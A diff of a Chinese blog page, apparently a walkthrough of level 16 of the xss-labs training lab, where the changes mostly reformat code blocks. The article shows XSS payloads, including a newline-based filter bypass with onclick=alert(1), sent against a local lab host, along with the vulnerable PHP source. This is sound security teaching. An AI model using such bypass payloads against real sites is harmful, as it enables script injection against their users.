@@ -494,7 +494,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    935
+                    895
                 </div>
                 
 
@@ -534,46 +534,20 @@
 
 <h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol>
 <li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p>
-<pre><code class="javascript">http://10.10.10.148:8203/level16.php?keyword=&lt;script&gt;alert(/onclink+src+data+href/)&lt;/script&gt;
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//10.10.10.148:8203/level16.php?keyword=&lt;script&gt;alert(/onclink+src+data+href/)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level16/注入点检测.png" alt="注入点检测"></center>
 
 <p>由上述操作可以推断，程序对<code>center</code>标签中参数的<code>script</code>、<code>/</code>、<code>空格</code>进行了转义，使用空字节阶段可以正常弹框，所以此处存在XSS漏洞。</p>
 </li>
 <li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p>
-<pre><code class="javascript">http://10.10.10.148:8203/level16.php?keyword=&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//10.10.10.148:8203/level16.php?keyword=&lt;a%0atype="text"%0aonclick="alert(1)"&gt;</span><br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level16/注入成功.png" alt="注入成功"></center>
 </li>
 <li><p>代码审计。程序源码如下所示：</p>
-<pre><code class="php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level16&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = strtolower($_GET[&quot;keyword&quot;]);
-$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
-$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
-$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
-$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);
-echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
-?&gt;
-&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
-&lt;?php 
-echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;
-?&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">"content-type"</span> content=<span class="hljs-string">"text/html;charset=utf-8"</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>  <br></span>&#123;     <br>confirm(<span class="hljs-string">"完成的不错！"</span>);<br> window.location.href=<span class="hljs-string">"level17.php?arg01=a&amp;arg02=b"</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level16&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br>ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);<br>$str = strtolower($_GET[<span class="hljs-string">"keyword"</span>]);<br>$str2=str_replace(<span class="hljs-string">"script"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,$str);<br>$str3=str_replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"&amp;nbsp;"</span>,$str2);<br>$str4=str_replace(<span class="hljs-string">"/"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,$str3);<br>$str5=str_replace(<span class="hljs-string">"	"</span>,<span class="hljs-string">"&amp;nbsp;"</span>,$str4);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;center&gt;"</span>.$str5.<span class="hljs-string">"&lt;/center&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str5).<span class="hljs-string">"&lt;/h3&gt;"</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
 <ul>
 <li>由17-22行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>script</code>、<code>/</code>、<code>空格</code>进行了转义后赋值给<code>span</code>标签。</li>
 </ul>
@@ -583,8 +557,10 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&l
 </ol>
 <h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul>
 <li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p>
-<pre><code class="javascript">&lt;a%0atype=&quot;text&quot;%0a&quot;alert&quot;&gt;
-...</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a%<span class="hljs-number">0</span>atype=<span class="hljs-string">"text"</span>%<span class="hljs-number">0</span>a<span class="hljs-string">"alert"</span>&gt;<br>...<br></code></pre></td></tr></table></figure>
+
+
+
 </li>
 </ul>
 <h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul>
@@ -1206,7 +1182,7 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&l
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
